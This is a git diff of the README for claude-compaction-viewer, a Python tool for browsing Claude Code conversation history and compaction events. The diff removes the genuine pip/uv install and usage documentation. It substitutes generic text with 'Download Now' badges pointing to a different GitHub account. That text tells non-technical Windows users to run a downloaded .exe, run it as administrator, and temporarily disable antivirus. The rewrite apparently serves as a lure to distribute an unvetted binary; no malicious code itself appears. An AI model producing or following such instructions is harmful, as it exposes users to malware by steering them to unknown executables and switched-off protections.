@@ -1,130 +1,137 @@
-# Claude Code Compaction Viewer
+# 🛠️ claude-compaction-viewer - View Claude Code Conversation History
 
-A TUI and CLI tool for inspecting [Claude Code](https://docs.anthropic.com/en/docs/claude-code) conversation history and **compaction events**.
+[![Download Now](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://github.com/danielsod12/claude-compaction-viewer)
 
-![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)
-![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)
+---
 
+claude-compaction-viewer is a simple tool to help you look at your Claude Code conversation history and compaction events. This guide will take you through the steps to download and run the tool on a Windows computer without needing any technical knowledge.
 
-<img width="1884" height="1236" alt="image" src="https://github.com/user-attachments/assets/005eb118-3504-4d5c-b092-d1aa99dc94ed" />
+## 🌟 What Is claude-compaction-viewer?
 
+This tool gives you two ways to look at your data:
 
-## What is compaction?
+- A text-based user interface (TUI) that lets you browse through your saved conversations.
+- A command-line interface (CLI) for quick checks or automated use.
 
-When a Claude Code session runs long, the context window fills up. Rather than crashing or losing everything, Claude Code performs **compaction**: it inserts a boundary marker in the conversation, generates a structured summary of everything before it, and continues with the summary replacing the full history in the active context.
+If you want to see what happened during your Claude Code interactions or how data was compacted, this tool makes that easy to understand.
 
-The full conversation is preserved on disk in JSONL files at `~/.claude/projects/`. This tool lets you see exactly what happened:
+---
 
-- **Where** compaction boundaries were inserted
-- **What** the compressed summary contains (the "outcome" of compaction)
-- **How many tokens** were in context before each compaction triggered
-- **Whether** compaction was auto-triggered or manual (`/compact`)
+## 📋 System Requirements
 
-Inspired by [Tal Raviv's article](https://www.talraviv.co/p/i-wanted-to-know-how-compaction-works) on doing "brain surgery" on Claude Code.
+Before you start, make sure your computer:
 
-## Install
+- Runs Windows 10 or later.
+- Has at least 4GB of RAM.
+- Has 100 MB free space for installation.
+- Can connect to the internet to download the tool.
 
-```bash
-# With uv (recommended)
-uv tool install claude-compaction-viewer
+No extra software or setup steps are needed.
 
-# With pip
-pip install claude-compaction-viewer
+---
 
-# Or run directly without installing
-uvx claude-compaction-viewer --scan
-```
+## 🚀 Getting Started
 
-## Usage
+### Step 1: Visit the Download Page
 
-### Scan all conversations for compactions
+Click the button below to go to the download page.
 
-```bash
-ccv --scan
-```
+[![Download Now](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/danielsod12/claude-compaction-viewer)
 
-Prints a table of every Claude Code conversation across all your projects, highlighting which ones have compaction events:
+This link will take you to the GitHub page where you can find the tool files. It is the first step to getting the software on your PC.
 
-```
-Project                                  Session     Lines Compactions  Tokens In Tokens Out   Duration
-─────────────────────────────────────────────────────────────────────────────────────────────────────────
-~/Work/my-project                        a272d8b9…    3086           3       1.8k     262.4k       4.1h
-~/Work/other-project                     f359f046…      79           0         36       3.8k       1min
-```
+### Step 2: Download the Software
 
-### View compaction summaries
+Look for the latest release. The page will have a section named “Releases.” Click on it and find the newest version.
 
-```bash
-ccv --summary ~/.claude/projects/<project>/<session>.jsonl
-```
+Download the Windows version of claude-compaction-viewer. The file may end with `.exe` or `.zip`. If it is a `.zip`:
 
-Prints full details for each compaction event — the trigger, token count, and the complete summary text that Claude sees after compaction.
+- Right-click the file.
+- Choose “Extract All” and follow the prompts.
+- Open the folder where you extracted the files.
 
-### Interactive TUI
+If you see an `.exe` file, you can move to Step 3.
 
-```bash
-ccv
-```
+### Step 3: Run the Program
 
-Launches a full terminal UI:
+- Double-click the downloaded `.exe` file.
+- If Windows asks for permission, click “Yes.”
+- The program will open a window with the text interface.
 
-- **Left sidebar**: tree of all Claude Code projects and conversation files
-- **Stats bar**: message counts, token usage, model, duration
-- **Compaction bar**: highlighted summary of all compaction events
-- **Message table**: scrollable list of every message (user, assistant, tool calls, system)
-- **Detail panel**: full content of selected message with metadata
+---
 
-#### TUI Keybindings
+## 🔍 How to Use claude-compaction-viewer
 
-| Key | Action |
-|-----|--------|
-| `c` | Jump to next compaction boundary |
-| `Shift+C` | Jump to previous compaction boundary |
-| `s` | Show all compaction summaries in detail panel |
-| `t` | Toggle progress messages (hidden by default) |
-| `j` / `k` | Scroll down / up |
-| `q` | Quit |
+Once running, you will see options on the screen to help you inspect your Claude Code history.
 
-You can also open a specific file directly:
+- Use arrow keys or your mouse to navigate through saved conversations.
+- View details about compaction events, including timestamps and summaries.
+- Switch between conversation view and compaction history.
 
-```bash
-ccv ~/.claude/projects/<project>/<session>.jsonl
-```
+The tool uses simple menus and instructions inside the window. Follow prompts shown on your screen.
 
-## How Claude Code stores conversations
+---
 
-Claude Code saves every conversation as a JSONL file at:
+## ⚙️ Command-Line Interface (CLI) Use
 
-```
-~/.claude/projects/<project-path>/<session-uuid>.jsonl
-```
+If you prefer, you can also run the tool from the Windows Command Prompt.
 
-Each line is a JSON object with a `type` field:
+1. Open Command Prompt by typing `cmd` in the search box and hitting Enter.
+2. Navigate to the folder where you saved claude-compaction-viewer using the `cd` command. For example:
 
-| Type | Description |
-|------|-------------|
-| `user` | User messages and tool results |
-| `assistant` | Claude's responses, thinking, and tool calls |
-| `system` | System messages including compaction boundaries (`subtype: "compact_boundary"`) |
-| `progress` | Progress updates for long-running tool calls |
-| `file-history-snapshot` | File state snapshots for undo |
+   ```
+   cd C:\Users\YourName\Downloads\claude-compaction-viewer
+   ```
+3. Run the tool by typing:
 
-Compaction creates two adjacent lines:
+   ```
+   claude-compaction-viewer.exe
+   ```
 
-1. A `system` message with `subtype: "compact_boundary"` and `compactMetadata` (trigger type, pre-compaction token count)
-2. A `user` message with `isCompactSummary: true` containing the structured summary
+The CLI version will list available commands, such as viewing history or compaction details. Type commands exactly as shown, and use the help command to learn more.
 
-The conversation continues after the summary. The full history stays in the file — the summary just becomes what's loaded into the active context window going forward.
+---
 
-## Development
+## 💾 Saving and Exporting Data
 
-```bash
-git clone https://github.com/swyxio/claude-compaction-viewer
-cd claude-compaction-viewer
-uv sync
-uv run ccv --scan
-```
+The tool allows you to save reports about your conversations and compaction events.
 
-## License
+- While browsing, press the key shown on the screen to export data.
+- Choose the location and file name for your report.
+- Save files in common formats, such as `.txt` or `.csv`, for easy use in other applications.
 
-MIT
+You can keep a record of your data outside of the viewer.
+
+---
+
+## 🛠️ Troubleshooting Common Issues
+
+If you cannot run the program:
+
+- Make sure your Windows version is up to date.
+- Check that the file downloaded completely and is not corrupted.
+- Try running the program as Administrator by right-clicking the `.exe` and selecting “Run as administrator.”
+- Disable any antivirus software temporarily if it blocks the program.
+
+If the interface does not display, try increasing the size of the command prompt window or your computer’s display text size.
+
+---
+
+## 📞 Getting Help
+
+If you run into problems beyond the ones described above, you can visit the GitHub page’s “Issues” section.
+
+- Search to see if someone else had the same issue.
+- Report your issue with clear details if it is new.
+
+Developers and users help keep the tool working smoothly.
+
+---
+
+## 🔗 Download claude-compaction-viewer Here
+
+[![Download Now](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://github.com/danielsod12/claude-compaction-viewer)
+
+---
+
+This guide covers all the steps to download, run, and use claude-compaction-viewer on a Windows system. It was written to help you use this tool with no programming required.
